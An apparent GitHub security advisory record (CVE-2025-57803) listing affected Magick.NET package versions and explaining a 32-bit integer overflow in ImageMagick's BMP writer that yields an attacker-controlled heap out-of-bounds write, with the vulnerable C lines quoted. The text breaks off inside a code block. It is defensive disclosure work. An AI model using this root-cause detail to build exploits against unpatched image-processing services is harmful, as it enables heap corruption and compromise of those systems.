{
  "affected": [
    {
      "database_specific": {
        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/08/GHSA-mxvv-97wh-cfmm/GHSA-mxvv-97wh-cfmm.json"
      },
      "package": {
        "ecosystem": "NuGet",
        "name": "Magick.NET-Q16-AnyCPU",
        "purl": "pkg:nuget/Magick.NET-Q16-AnyCPU"
      },
      "ranges": [
        {
          "events": [
            {
              "introduced": "0"
            },
            {
              "fixed": "14.8.1"
            }
          ],
          "type": "ECOSYSTEM"
        }
      ],
      "versions": [
        "10.0.0",
        "10.1.0",
        "11.0.0",
        "11.1.0",
        "11.1.1",
        "11.1.2",
        "11.2.0",
        "11.2.1",
        "11.3.0",
        "12.0.0",
        "12.0.1",
        "12.1.0",
        "12.2.0",
        "12.2.1",
        "12.2.2",
        "12.3.0",
        "13.0.0",
        "13.0.1",
        "13.1.0",
        "13.1.1",
        "13.1.2",
        "13.1.3",
        "13.10.0",
        "13.2.0",
        "13.3.0",
        "13.4.0",
        "13.5.0",
        "13.6.0",
        "13.7.0",
        "13.8.0",
        "13.9.0",
        "13.9.1",
        "14.0.0",
        "14.1.0",
        "14.2.0",
        "14.3.0",
        "14.4.0",
        "14.5.0",
        "14.6.0",
        "14.7.0",
        "14.8.0",
        "6.8.8.1001",
        "6.8.9.1",
        "6.8.9.101",
        "6.8.9.2",
        "6.8.9.401",
        "6.8.9.501",
        "6.8.9.601",
        "7.0.0.1",
        "7.0.0.10",
        "7.0.0.101",
        "7.0.0.102",
        "7.0.0.103",
        "7.0.0.104",
        "7.0.0.11",
        "7.0.0.12",
        "7.0.0.13",
        "7.0.0.14",
        "7.0.0.15",
        "7.0.0.16",
        "7.0.0.17",
        "7.0.0.18",
        "7.0.0.19",
        "7.0.0.2",
        "7.0.0.20",
        "7.0.0.21",
        "7.0.0.22",
        "7.0.0.3",
        "7.0.0.4",
        "7.0.0.5",
        "7.0.0.6",
        "7.0.0.7",
        "7.0.0.8",
        "7.0.0.9",
        "7.0.1",
        "7.0.1.100",
        "7.0.1.101",
        "7.0.1.500",
        "7.0.2.100",
        "7.0.2.400",
        "7.0.2.600",
        "7.0.2.900",
        "7.0.2.901",
        "7.0.2.902",
        "7.0.3",
        "7.0.3.1",
        "7.0.3.300",
        "7.0.3.500",
        "7.0.3.501",
        "7.0.3.502",
        "7.0.3.901",
        "7.0.3.902",
        "7.0.4.100",
        "7.0.4.400",
        "7.0.4.700",
        "7.0.4.701",
        "7.0.5.500",
        "7.0.5.501",
        "7.0.5.502",
        "7.0.5.800",
        "7.0.5.900",
        "7.0.6",
        "7.0.6.100",
        "7.0.6.1000",
        "7.0.6.1001",
        "7.0.6.1002",
        "7.0.6.101",
        "7.0.6.102",
        "7.0.6.600",
        "7.0.6.601",
        "7.0.7",
        "7.0.7.300",
        "7.0.7.700",
        "7.0.7.900",
        "7.1.0",
        "7.10.0",
        "7.10.1",
        "7.10.2",
        "7.11.0",
        "7.11.1",
        "7.12.0",
        "7.13.0",
        "7.13.1",
        "7.14.0",
        "7.14.0.1",
        "7.14.0.2",
        "7.14.0.3",
        "7.14.1",
        "7.14.2",
        "7.14.3",
        "7.14.4",
        "7.14.5",
        "7.15.0",
        "7.15.0.1",
        "7.15.1",
        "7.15.2",
        "7.15.3",
        "7.15.4",
        "7.15.5",
        "7.16.0",
        "7.16.1",
        "7.17.0",
        "7.17.0.1",
        "7.18.0",
        "7.19.0",
        "7.19.0.1",
        "7.2.0",
        "7.2.1",
        "7.20.0",
        "7.20.0.1",
        "7.21.0",
        "7.21.1",
        "7.22.0",
        "7.22.1",
        "7.22.2",
        "7.22.2.1",
        "7.22.2.2",
        "7.22.3",
        "7.23.0",
        "7.23.1",
        "7.23.2",
        "7.23.2.1",
        "7.23.3",
        "7.23.4",
        "7.24.0",
        "7.24.1",
        "7.3.0",
        "7.4.0",
        "7.4.1",
        "7.4.2",
        "7.4.3",
        "7.4.4",
        "7.4.5",
        "7.4.6",
        "7.5.0",
        "7.5.0.1",
        "7.6.0",
        "7.6.0.1",
        "7.7.0",
        "7.8.0",
        "7.9.0",
        "7.9.0.1",
        "7.9.0.2",
        "7.9.1",
        "7.9.2",
        "8.0.0",
        "8.0.1",
        "8.1.0",
        "8.2.0",
        "8.2.1",
        "8.3.0",
        "8.3.1",
        "8.3.2",
        "8.3.3",
        "8.4.0",
        "8.5.0",
        "8.6.0",
        "8.6.1",
        "9.0.0",
        "9.1.0",
        "9.1.1",
        "9.1.2"
      ]
    },
    {
      "database_specific": {
        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/08/GHSA-mxvv-97wh-cfmm/GHSA-mxvv-97wh-cfmm.json"
      },
      "package": {
        "ecosystem": "NuGet",
        "name": "Magick.NET-Q16-HDRI-AnyCPU",
        "purl": "pkg:nuget/Magick.NET-Q16-HDRI-AnyCPU"
      },
      "ranges": [
        {
          "events": [
            {
              "introduced": "0"
            },
            {
              "fixed": "14.8.1"
            }
          ],
          "type": "ECOSYSTEM"
        }
      ],
      "versions": [
        "10.0.0",
        "10.1.0",
        "11.0.0",
        "11.1.0",
        "11.1.1",
        "11.1.2",
        "11.2.0",
        "11.2.1",
        "11.3.0",
        "12.0.0",
        "12.0.1",
        "12.1.0",
        "12.2.0",
        "12.2.1",
        "12.2.2",
        "12.3.0",
        "13.0.0",
        "13.0.1",
        "13.1.0",
        "13.1.1",
        "13.1.2",
        "13.1.3",
        "13.10.0",
        "13.2.0",
        "13.3.0",
        "13.4.0",
        "13.5.0",
        "13.6.0",
        "13.7.0",
        "13.8.0",
        "13.9.0",
        "13.9.1",
        "14.0.0",
        "14.1.0",
        "14.2.0",
        "14.3.0",
        "14.4.0",
        "14.5.0",
        "14.6.0",
        "14.7.0",
        "14.8.0",
        "6.8.9.101",
        "6.8.9.401",
        "6.8.9.501",
        "6.8.9.601",
        "7.0.0.1",
        "7.0.0.10",
        "7.0.0.101",
        "7.0.0.102",
        "7.0.0.103",
        "7.0.0.104",
        "7.0.0.11",
        "7.0.0.12",
        "7.0.0.13",
        "7.0.0.14",
        "7.0.0.15",
        "7.0.0.16",
        "7.0.0.17",
        "7.0.0.18",
        "7.0.0.19",
        "7.0.0.2",
        "7.0.0.20",
        "7.0.0.21",
        "7.0.0.22",
        "7.0.0.3",
        "7.0.0.4",
        "7.0.0.5",
        "7.0.0.6",
        "7.0.0.7",
        "7.0.0.8",
        "7.0.0.9",
        "7.0.1",
        "7.0.1.100",
        "7.0.1.101",
        "7.0.1.500",
        "7.0.2.100",
        "7.0.2.400",
        "7.0.2.600",
        "7.0.2.900",
        "7.0.2.901",
        "7.0.2.902",
        "7.0.3",
        "7.0.3.1",
        "7.0.3.300",
        "7.0.3.500",
        "7.0.3.501",
        "7.0.3.502",
        "7.0.3.901",
        "7.0.3.902",
        "7.0.4.100",
        "7.0.4.400",
        "7.0.4.700",
        "7.0.4.701",
        "7.0.5.500",
        "7.0.5.501",
        "7.0.5.502",
        "7.0.5.800",
        "7.0.5.900",
        "7.0.6",
        "7.0.6.100",
        "7.0.6.1000",
        "7.0.6.1001",
        "7.0.6.1002",
        "7.0.6.101",
        "7.0.6.102",
        "7.0.6.600",
        "7.0.6.601",
        "7.0.7",
        "7.0.7.300",
        "7.0.7.700",
        "7.0.7.900",
        "7.1.0",
        "7.10.0",
        "7.10.1",
        "7.10.2",
        "7.11.0",
        "7.11.1",
        "7.12.0",
        "7.13.0",
        "7.13.1",
        "7.14.0",
        "7.14.0.1",
        "7.14.0.2",
        "7.14.0.3",
        "7.14.1",
        "7.14.2",
        "7.14.3",
        "7.14.4",
        "7.14.5",
        "7.15.0",
        "7.15.0.1",
        "7.15.1",
        "7.15.2",
        "7.15.3",
        "7.15.4",
        "7.15.5",
        "7.16.0",
        "7.16.1",
        "7.17.0",
        "7.17.0.1",
        "7.18.0",
        "7.19.0",
        "7.19.0.1",
        "7.2.0",
        "7.2.1",
        "7.20.0",
        "7.20.0.1",
        "7.21.0",
        "7.21.1",
        "7.22.0",
        "7.22.1",
        "7.22.2",
        "7.22.2.1",
        "7.22.2.2",
        "7.22.3",
        "7.23.0",
        "7.23.1",
        "7.23.2",
        "7.23.2.1",
        "7.23.3",
        "7.23.4",
        "7.24.0",
        "7.24.1",
        "7.3.0",
        "7.4.0",
        "7.4.1",
        "7.4.2",
        "7.4.3",
        "7.4.4",
        "7.4.5",
        "7.4.6",
        "7.5.0",
        "7.5.0.1",
        "7.6.0",
        "7.6.0.1",
        "7.7.0",
        "7.8.0",
        "7.9.0",
        "7.9.0.1",
        "7.9.0.2",
        "7.9.1",
        "7.9.2",
        "8.0.0",
        "8.0.1",
        "8.1.0",
        "8.2.0",
        "8.2.1",
        "8.3.0",
        "8.3.1",
        "8.3.2",
        "8.3.3",
        "8.4.0",
        "8.5.0",
        "8.6.0",
        "8.6.1",
        "9.0.0",
        "9.1.0",
        "9.1.1",
        "9.1.2"
      ]
    },
    {
      "database_specific": {
        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/08/GHSA-mxvv-97wh-cfmm/GHSA-mxvv-97wh-cfmm.json"
      },
      "package": {
        "ecosystem": "NuGet",
        "name": "Magick.NET-Q16-HDRI-x86",
        "purl": "pkg:nuget/Magick.NET-Q16-HDRI-x86"
      },
      "ranges": [
        {
          "events": [
            {
              "introduced": "0"
            },
            {
              "fixed": "14.8.1"
            }
          ],
          "type": "ECOSYSTEM"
        }
      ],
      "versions": [
        "10.0.0",
        "10.1.0",
        "11.0.0",
        "11.1.0",
        "11.1.1",
        "11.1.2",
        "11.2.0",
        "11.2.1",
        "11.3.0",
        "12.0.0",
        "12.0.1",
        "12.1.0",
        "12.2.0",
        "12.2.1",
        "12.2.2",
        "12.3.0",
        "13.0.0",
        "13.0.1",
        "13.1.0",
        "13.1.1",
        "13.1.2",
        "13.1.3",
        "13.10.0",
        "13.2.0",
        "13.3.0",
        "13.4.0",
        "13.5.0",
        "13.6.0",
        "13.7.0",
        "13.8.0",
        "13.9.0",
        "13.9.1",
        "14.0.0",
        "14.1.0",
        "14.2.0",
        "14.3.0",
        "14.4.0",
        "14.5.0",
        "14.6.0",
        "14.7.0",
        "14.8.0",
        "6.8.9.101",
        "6.8.9.401",
        "6.8.9.501",
        "6.8.9.601",
        "7.0.0.1",
        "7.0.0.10",
        "7.0.0.101",
        "7.0.0.102",
        "7.0.0.103",
        "7.0.0.104",
        "7.0.0.11",
        "7.0.0.12",
        "7.0.0.13",
        "7.0.0.14",
        "7.0.0.15",
        "7.0.0.16",
        "7.0.0.17",
        "7.0.0.18",
        "7.0.0.19",
        "7.0.0.2",
        "7.0.0.20",
        "7.0.0.21",
        "7.0.0.22",
        "7.0.0.3",
        "7.0.0.4",
        "7.0.0.5",
        "7.0.0.6",
        "7.0.0.7",
        "7.0.0.8",
        "7.0.0.9",
        "7.0.1",
        "7.0.1.100",
        "7.0.1.101",
        "7.0.1.500",
        "7.0.2.100",
        "7.0.2.400",
        "7.0.2.600",
        "7.0.2.900",
        "7.0.2.901",
        "7.0.2.902",
        "7.0.3",
        "7.0.3.1",
        "7.0.3.300",
        "7.0.3.500",
        "7.0.3.501",
        "7.0.3.502",
        "7.0.3.901",
        "7.0.3.902",
        "7.0.4.100",
        "7.0.4.400",
        "7.0.4.700",
        "7.0.4.701",
        "7.0.5.500",
        "7.0.5.501",
        "7.0.5.502",
        "7.0.5.800",
        "7.0.5.900",
        "7.0.6",
        "7.0.6.100",
        "7.0.6.1000",
        "7.0.6.1001",
        "7.0.6.1002",
        "7.0.6.101",
        "7.0.6.102",
        "7.0.6.600",
        "7.0.6.601",
        "7.0.7",
        "7.0.7.300",
        "7.0.7.700",
        "7.0.7.900",
        "7.1.0",
        "7.10.0",
        "7.10.1",
        "7.10.2",
        "7.11.0",
        "7.11.1",
        "7.12.0",
        "7.13.0",
        "7.13.1",
        "7.14.0",
        "7.14.0.1",
        "7.14.0.2",
        "7.14.0.3",
        "7.14.1",
        "7.14.2",
        "7.14.3",
        "7.14.4",
        "7.14.5",
        "7.15.0",
        "7.15.0.1",
        "7.15.1",
        "7.15.2",
        "7.15.3",
        "7.15.4",
        "7.15.5",
        "7.16.0",
        "7.16.1",
        "7.17.0",
        "7.17.0.1",
        "7.18.0",
        "7.19.0",
        "7.19.0.1",
        "7.2.0",
        "7.2.1",
        "7.20.0",
        "7.20.0.1",
        "7.21.0",
        "7.21.1",
        "7.22.0",
        "7.22.1",
        "7.22.2",
        "7.22.2.1",
        "7.22.2.2",
        "7.22.3",
        "7.23.0",
        "7.23.1",
        "7.23.2",
        "7.23.2.1",
        "7.23.3",
        "7.23.4",
        "7.24.0",
        "7.24.1",
        "7.3.0",
        "7.4.0",
        "7.4.1",
        "7.4.2",
        "7.4.3",
        "7.4.4",
        "7.4.5",
        "7.4.6",
        "7.5.0",
        "7.5.0.1",
        "7.6.0",
        "7.6.0.1",
        "7.7.0",
        "7.8.0",
        "7.9.0",
        "7.9.0.1",
        "7.9.0.2",
        "7.9.1",
        "7.9.2",
        "8.0.0",
        "8.0.1",
        "8.1.0",
        "8.2.0",
        "8.2.1",
        "8.3.0",
        "8.3.1",
        "8.3.2",
        "8.3.3",
        "8.4.0",
        "8.5.0",
        "8.6.0",
        "8.6.1",
        "9.0.0",
        "9.1.0",
        "9.1.1",
        "9.1.2"
      ]
    },
    {
      "database_specific": {
        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/08/GHSA-mxvv-97wh-cfmm/GHSA-mxvv-97wh-cfmm.json"
      },
      "package": {
        "ecosystem": "NuGet",
        "name": "Magick.NET-Q16-x86",
        "purl": "pkg:nuget/Magick.NET-Q16-x86"
      },
      "ranges": [
        {
          "events": [
            {
              "introduced": "0"
            },
            {
              "fixed": "14.8.1"
            }
          ],
          "type": "ECOSYSTEM"
        }
      ],
      "versions": [
        "10.0.0",
        "10.1.0",
        "11.0.0",
        "11.1.0",
        "11.1.1",
        "11.1.2",
        "11.2.0",
        "11.2.1",
        "11.3.0",
        "12.0.0",
        "12.0.1",
        "12.1.0",
        "12.2.0",
        "12.2.1",
        "12.2.2",
        "12.3.0",
        "13.0.0",
        "13.0.1",
        "13.1.0",
        "13.1.1",
        "13.1.2",
        "13.1.3",
        "13.10.0",
        "13.2.0",
        "13.3.0",
        "13.4.0",
        "13.5.0",
        "13.6.0",
        "13.7.0",
        "13.8.0",
        "13.9.0",
        "13.9.1",
        "14.0.0",
        "14.1.0",
        "14.2.0",
        "14.3.0",
        "14.4.0",
        "14.5.0",
        "14.6.0",
        "14.7.0",
        "14.8.0",
        "6.8.5.1001",
        "6.8.5.401",
        "6.8.5.402",
        "6.8.6.301",
        "6.8.6.601",
        "6.8.6.801",
        "6.8.7.1",
        "6.8.7.101",
        "6.8.7.501",
        "6.8.7.502",
        "6.8.7.901",
        "6.8.8.1001",
        "6.8.8.201",
        "6.8.8.501",
        "6.8.8.701",
        "6.8.8.801",
        "6.8.8.901",
        "6.8.9.1",
        "6.8.9.101",
        "6.8.9.2",
        "6.8.9.401",
        "6.8.9.501",
        "6.8.9.601",
        "7.0.0.1",
        "7.0.0.10",
        "7.0.0.101",
        "7.0.0.102",
        "7.0.0.103",
        "7.0.0.104",
        "7.0.0.11",
        "7.0.0.12",
        "7.0.0.13",
        "7.0.0.14",
        "7.0.0.15",
        "7.0.0.16",
        "7.0.0.17",
        "7.0.0.18",
        "7.0.0.19",
        "7.0.0.2",
        "7.0.0.20",
        "7.0.0.21",
        "7.0.0.22",
        "7.0.0.3",
        "7.0.0.4",
        "7.0.0.5",
        "7.0.0.6",
        "7.0.0.7",
        "7.0.0.8",
        "7.0.0.9",
        "7.0.1",
        "7.0.1.100",
        "7.0.1.101",
        "7.0.1.500",
        "7.0.2.100",
        "7.0.2.400",
        "7.0.2.600",
        "7.0.2.900",
        "7.0.2.901",
        "7.0.2.902",
        "7.0.3",
        "7.0.3.1",
        "7.0.3.300",
        "7.0.3.500",
        "7.0.3.501",
        "7.0.3.502",
        "7.0.3.901",
        "7.0.3.902",
        "7.0.4.100",
        "7.0.4.400",
        "7.0.4.700",
        "7.0.4.701",
        "7.0.5.500",
        "7.0.5.501",
        "7.0.5.502",
        "7.0.5.800",
        "7.0.5.900",
        "7.0.6",
        "7.0.6.100",
        "7.0.6.1000",
        "7.0.6.1001",
        "7.0.6.1002",
        "7.0.6.101",
        "7.0.6.102",
        "7.0.6.600",
        "7.0.6.601",
        "7.0.7",
        "7.0.7.300",
        "7.0.7.700",
        "7.0.7.900",
        "7.1.0",
        "7.10.0",
        "7.10.1",
        "7.10.2",
        "7.11.0",
        "7.11.1",
        "7.12.0",
        "7.13.0",
        "7.13.1",
        "7.14.0",
        "7.14.0.1",
        "7.14.0.2",
        "7.14.0.3",
        "7.14.1",
        "7.14.2",
        "7.14.3",
        "7.14.4",
        "7.14.5",
        "7.15.0",
        "7.15.0.1",
        "7.15.1",
        "7.15.2",
        "7.15.3",
        "7.15.4",
        "7.15.5",
        "7.16.0",
        "7.16.1",
        "7.17.0",
        "7.17.0.1",
        "7.18.0",
        "7.19.0",
        "7.19.0.1",
        "7.2.0",
        "7.2.1",
        "7.20.0",
        "7.20.0.1",
        "7.21.0",
        "7.21.1",
        "7.22.0",
        "7.22.1",
        "7.22.2",
        "7.22.2.1",
        "7.22.2.2",
        "7.22.3",
        "7.23.0",
        "7.23.1",
        "7.23.2",
        "7.23.2.1",
        "7.23.3",
        "7.23.4",
        "7.24.0",
        "7.24.1",
        "7.3.0",
        "7.4.0",
        "7.4.1",
        "7.4.2",
        "7.4.3",
        "7.4.4",
        "7.4.5",
        "7.4.6",
        "7.5.0",
        "7.5.0.1",
        "7.6.0",
        "7.6.0.1",
        "7.7.0",
        "7.8.0",
        "7.9.0",
        "7.9.0.1",
        "7.9.0.2",
        "7.9.1",
        "7.9.2",
        "8.0.0",
        "8.0.1",
        "8.1.0",
        "8.2.0",
        "8.2.1",
        "8.3.0",
        "8.3.1",
        "8.3.2",
        "8.3.3",
        "8.4.0",
        "8.5.0",
        "8.6.0",
        "8.6.1",
        "9.0.0",
        "9.1.0",
        "9.1.1",
        "9.1.2"
      ]
    },
    {
      "database_specific": {
        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/08/GHSA-mxvv-97wh-cfmm/GHSA-mxvv-97wh-cfmm.json"
      },
      "package": {
        "ecosystem": "NuGet",
        "name": "Magick.NET-Q8-AnyCPU",
        "purl": "pkg:nuget/Magick.NET-Q8-AnyCPU"
      },
      "ranges": [
        {
          "events": [
            {
              "introduced": "0"
            },
            {
              "fixed": "14.8.1"
            }
          ],
          "type": "ECOSYSTEM"
        }
      ],
      "versions": [
        "10.0.0",
        "10.1.0",
        "11.0.0",
        "11.1.0",
        "11.1.1",
        "11.1.2",
        "11.2.0",
        "11.2.1",
        "11.3.0",
        "12.0.0",
        "12.0.1",
        "12.1.0",
        "12.2.0",
        "12.2.1",
        "12.2.2",
        "12.3.0",
        "13.0.0",
        "13.0.1",
        "13.1.0",
        "13.1.1",
        "13.1.2",
        "13.1.3",
        "13.10.0",
        "13.2.0",
        "13.3.0",
        "13.4.0",
        "13.5.0",
        "13.6.0",
        "13.7.0",
        "13.8.0",
        "13.9.0",
        "13.9.1",
        "14.0.0",
        "14.1.0",
        "14.2.0",
        "14.3.0",
        "14.4.0",
        "14.5.0",
        "14.6.0",
        "14.7.0",
        "14.8.0",
        "6.8.8.1001",
        "6.8.9.1",
        "6.8.9.101",
        "6.8.9.2",
        "6.8.9.401",
        "6.8.9.501",
        "6.8.9.601",
        "7.0.0.1",
        "7.0.0.10",
        "7.0.0.101",
        "7.0.0.102",
        "7.0.0.103",
        "7.0.0.104",
        "7.0.0.11",
        "7.0.0.12",
        "7.0.0.13",
        "7.0.0.14",
        "7.0.0.15",
        "7.0.0.16",
        "7.0.0.17",
        "7.0.0.18",
        "7.0.0.19",
        "7.0.0.2",
        "7.0.0.20",
        "7.0.0.21",
        "7.0.0.22",
        "7.0.0.3",
        "7.0.0.4",
        "7.0.0.5",
        "7.0.0.6",
        "7.0.0.7",
        "7.0.0.8",
        "7.0.0.9",
        "7.0.1",
        "7.0.1.100",
        "7.0.1.101",
        "7.0.1.500",
        "7.0.2.100",
        "7.0.2.400",
        "7.0.2.600",
        "7.0.2.900",
        "7.0.2.901",
        "7.0.2.902",
        "7.0.3",
        "7.0.3.1",
        "7.0.3.300",
        "7.0.3.500",
        "7.0.3.501",
        "7.0.3.502",
        "7.0.3.901",
        "7.0.3.902",
        "7.0.4.100",
        "7.0.4.400",
        "7.0.4.700",
        "7.0.4.701",
        "7.0.5.500",
        "7.0.5.501",
        "7.0.5.502",
        "7.0.5.800",
        "7.0.5.900",
        "7.0.6",
        "7.0.6.100",
        "7.0.6.1000",
        "7.0.6.1001",
        "7.0.6.1002",
        "7.0.6.101",
        "7.0.6.102",
        "7.0.6.600",
        "7.0.6.601",
        "7.0.7",
        "7.0.7.300",
        "7.0.7.700",
        "7.0.7.900",
        "7.1.0",
        "7.10.0",
        "7.10.1",
        "7.10.2",
        "7.11.0",
        "7.11.1",
        "7.12.0",
        "7.13.0",
        "7.13.1",
        "7.14.0",
        "7.14.0.1",
        "7.14.0.2",
        "7.14.0.3",
        "7.14.1",
        "7.14.2",
        "7.14.3",
        "7.14.4",
        "7.14.5",
        "7.15.0",
        "7.15.0.1",
        "7.15.1",
        "7.15.2",
        "7.15.3",
        "7.15.4",
        "7.15.5",
        "7.16.0",
        "7.16.1",
        "7.17.0",
        "7.17.0.1",
        "7.18.0",
        "7.19.0",
        "7.19.0.1",
        "7.2.0",
        "7.2.1",
        "7.20.0",
        "7.20.0.1",
        "7.21.0",
        "7.21.1",
        "7.22.0",
        "7.22.1",
        "7.22.2",
        "7.22.2.1",
        "7.22.2.2",
        "7.22.3",
        "7.23.0",
        "7.23.1",
        "7.23.2",
        "7.23.2.1",
        "7.23.3",
        "7.23.4",
        "7.24.0",
        "7.24.1",
        "7.3.0",
        "7.4.0",
        "7.4.1",
        "7.4.2",
        "7.4.3",
        "7.4.4",
        "7.4.5",
        "7.4.6",
        "7.5.0",
        "7.5.0.1",
        "7.6.0",
        "7.6.0.1",
        "7.7.0",
        "7.8.0",
        "7.9.0",
        "7.9.0.1",
        "7.9.0.2",
        "7.9.1",
        "7.9.2",
        "8.0.0",
        "8.0.1",
        "8.1.0",
        "8.2.0",
        "8.2.1",
        "8.3.0",
        "8.3.1",
        "8.3.2",
        "8.3.3",
        "8.4.0",
        "8.5.0",
        "8.6.0",
        "8.6.1",
        "9.0.0",
        "9.1.0",
        "9.1.1",
        "9.1.2"
      ]
    },
    {
      "database_specific": {
        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/08/GHSA-mxvv-97wh-cfmm/GHSA-mxvv-97wh-cfmm.json"
      },
      "package": {
        "ecosystem": "NuGet",
        "name": "Magick.NET-Q8-x86",
        "purl": "pkg:nuget/Magick.NET-Q8-x86"
      },
      "ranges": [
        {
          "events": [
            {
              "introduced": "0"
            },
            {
              "fixed": "14.8.1"
            }
          ],
          "type": "ECOSYSTEM"
        }
      ],
      "versions": [
        "10.0.0",
        "10.1.0",
        "11.0.0",
        "11.1.0",
        "11.1.1",
        "11.1.2",
        "11.2.0",
        "11.2.1",
        "11.3.0",
        "12.0.0",
        "12.0.1",
        "12.1.0",
        "12.2.0",
        "12.2.1",
        "12.2.2",
        "12.3.0",
        "13.0.0",
        "13.0.1",
        "13.1.0",
        "13.1.1",
        "13.1.2",
        "13.1.3",
        "13.10.0",
        "13.2.0",
        "13.3.0",
        "13.4.0",
        "13.5.0",
        "13.6.0",
        "13.7.0",
        "13.8.0",
        "13.9.0",
        "13.9.1",
        "14.0.0",
        "14.1.0",
        "14.2.0",
        "14.3.0",
        "14.4.0",
        "14.5.0",
        "14.6.0",
        "14.7.0",
        "14.8.0",
        "6.8.5.1001",
        "6.8.5.401",
        "6.8.5.402",
        "6.8.6.301",
        "6.8.6.601",
        "6.8.6.801",
        "6.8.7.1",
        "6.8.7.101",
        "6.8.7.501",
        "6.8.7.502",
        "6.8.7.901",
        "6.8.8.1001",
        "6.8.8.201",
        "6.8.8.501",
        "6.8.8.701",
        "6.8.8.801",
        "6.8.8.901",
        "6.8.9.1",
        "6.8.9.101",
        "6.8.9.2",
        "6.8.9.401",
        "6.8.9.501",
        "6.8.9.601",
        "7.0.0.1",
        "7.0.0.10",
        "7.0.0.101",
        "7.0.0.102",
        "7.0.0.103",
        "7.0.0.104",
        "7.0.0.11",
        "7.0.0.12",
        "7.0.0.13",
        "7.0.0.14",
        "7.0.0.15",
        "7.0.0.16",
        "7.0.0.17",
        "7.0.0.18",
        "7.0.0.19",
        "7.0.0.2",
        "7.0.0.20",
        "7.0.0.21",
        "7.0.0.22",
        "7.0.0.3",
        "7.0.0.4",
        "7.0.0.5",
        "7.0.0.6",
        "7.0.0.7",
        "7.0.0.8",
        "7.0.0.9",
        "7.0.1",
        "7.0.1.100",
        "7.0.1.101",
        "7.0.1.500",
        "7.0.2.100",
        "7.0.2.400",
        "7.0.2.600",
        "7.0.2.900",
        "7.0.2.901",
        "7.0.2.902",
        "7.0.3",
        "7.0.3.1",
        "7.0.3.300",
        "7.0.3.500",
        "7.0.3.501",
        "7.0.3.502",
        "7.0.3.901",
        "7.0.3.902",
        "7.0.4.100",
        "7.0.4.400",
        "7.0.4.700",
        "7.0.4.701",
        "7.0.5.500",
        "7.0.5.501",
        "7.0.5.502",
        "7.0.5.800",
        "7.0.5.900",
        "7.0.6",
        "7.0.6.100",
        "7.0.6.1000",
        "7.0.6.1001",
        "7.0.6.1002",
        "7.0.6.101",
        "7.0.6.102",
        "7.0.6.600",
        "7.0.6.601",
        "7.0.7",
        "7.0.7.300",
        "7.0.7.700",
        "7.0.7.900",
        "7.1.0",
        "7.10.0",
        "7.10.1",
        "7.10.2",
        "7.11.0",
        "7.11.1",
        "7.12.0",
        "7.13.0",
        "7.13.1",
        "7.14.0",
        "7.14.0.1",
        "7.14.0.2",
        "7.14.0.3",
        "7.14.1",
        "7.14.2",
        "7.14.3",
        "7.14.4",
        "7.14.5",
        "7.15.0",
        "7.15.0.1",
        "7.15.1",
        "7.15.2",
        "7.15.3",
        "7.15.4",
        "7.15.5",
        "7.16.0",
        "7.16.1",
        "7.17.0",
        "7.17.0.1",
        "7.18.0",
        "7.19.0",
        "7.19.0.1",
        "7.2.0",
        "7.2.1",
        "7.20.0",
        "7.20.0.1",
        "7.21.0",
        "7.21.1",
        "7.22.0",
        "7.22.1",
        "7.22.2",
        "7.22.2.1",
        "7.22.2.2",
        "7.22.3",
        "7.23.0",
        "7.23.1",
        "7.23.2",
        "7.23.2.1",
        "7.23.3",
        "7.23.4",
        "7.24.0",
        "7.24.1",
        "7.3.0",
        "7.4.0",
        "7.4.1",
        "7.4.2",
        "7.4.3",
        "7.4.4",
        "7.4.5",
        "7.4.6",
        "7.5.0",
        "7.5.0.1",
        "7.6.0",
        "7.6.0.1",
        "7.7.0",
        "7.8.0",
        "7.9.0",
        "7.9.0.1",
        "7.9.0.2",
        "7.9.1",
        "7.9.2",
        "8.0.0",
        "8.0.1",
        "8.1.0",
        "8.2.0",
        "8.2.1",
        "8.3.0",
        "8.3.1",
        "8.3.2",
        "8.3.3",
        "8.4.0",
        "8.5.0",
        "8.6.0",
        "8.6.1",
        "9.0.0",
        "9.1.0",
        "9.1.1",
        "9.1.2"
      ]
    }
  ],
  "aliases": [
    "CVE-2025-57803"
  ],
  "database_specific": {
    "cwe_ids": [
      "CWE-122",
      "CWE-190"
    ],
    "github_reviewed": true,
    "github_reviewed_at": "2025-08-26T16:07:27Z",
    "nvd_published_at": null,
    "severity": "HIGH"
  },
  "details": "## Summary\n\nA 32-bit integer overflow in the BMP encoder\u2019s scanline-stride computation collapses\u00a0`bytes_per_line`\u00a0(stride) to a tiny value while the per-row writer still emits\u00a0`3 \u00d7 width`\u00a0bytes for 24-bpp images. The row base pointer advances using the (overflowed) stride, so the first row immediately writes past its slot and into adjacent heap memory with attacker-controlled bytes. This is a classic, powerful primitive for heap corruption in common auto-convert pipelines.\n\n- **Impact:**\u00a0Attacker-controlled heap out-of-bounds (OOB) write during conversion\u00a0**to BMP**.\n    \n- **Surface:**\u00a0Typical upload \u2192 normalize/thumbnail \u2192\u00a0`magick ... out.bmp`\u00a0workers.\n    \n- **32-bit:**\u00a0**Vulnerable**\u00a0(reproduced with ASan).\n    \n- **64-bit:**\u00a0Safe from this specific integer overflow (IOF) by arithmetic, but still add product/size guards.\n    \n- **Proposed severity:**\u00a0**Critical 9.8**\u00a0(CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H).\n    \n\n---\n\n## Scope & Affected Builds\n\n- **Project:**\u00a0ImageMagick (BMP writer path,\u00a0`WriteBMPImage`\u00a0in\u00a0`coders/bmp.c`).\n    \n- **Commit under test:**\u00a0`3fcd081c0278427fc0e8ac40ef75c0a1537792f7`\n    \n- **Version string from the run:**\u00a0`ImageMagick 7.1.2-0 Q8 i686 9bde76f1d:20250712`\n    \n- **Architecture:**\u00a032-bit i686 (**`sizeof(size_t) == 4`**) with ASan/UBSan.\n    \n- **Note on other versions:**\u00a0Any release/branch with the same stride arithmetic and row loop is likely affected on 32-bit.\n    \n\n---\n\n## Root Cause (with code anchors)\n\n### Stride computation (writer)\n\n```c\nbytes_per_line = 4 * ((image->columns * bmp_info.bits_per_pixel + 31) / 32);\n```\n\n### Per-row base and 24-bpp loop (writer)\n\n```c\nq = pixels + ((ssize_t)image->rows - y - 1) * (ssize_t)bytes_per_line;\nfor (x = 0; x < (ssize_t)image->columns; x++) {\n  *q++ = B(...); *q++ = G(...); *q++ = R(...);  // 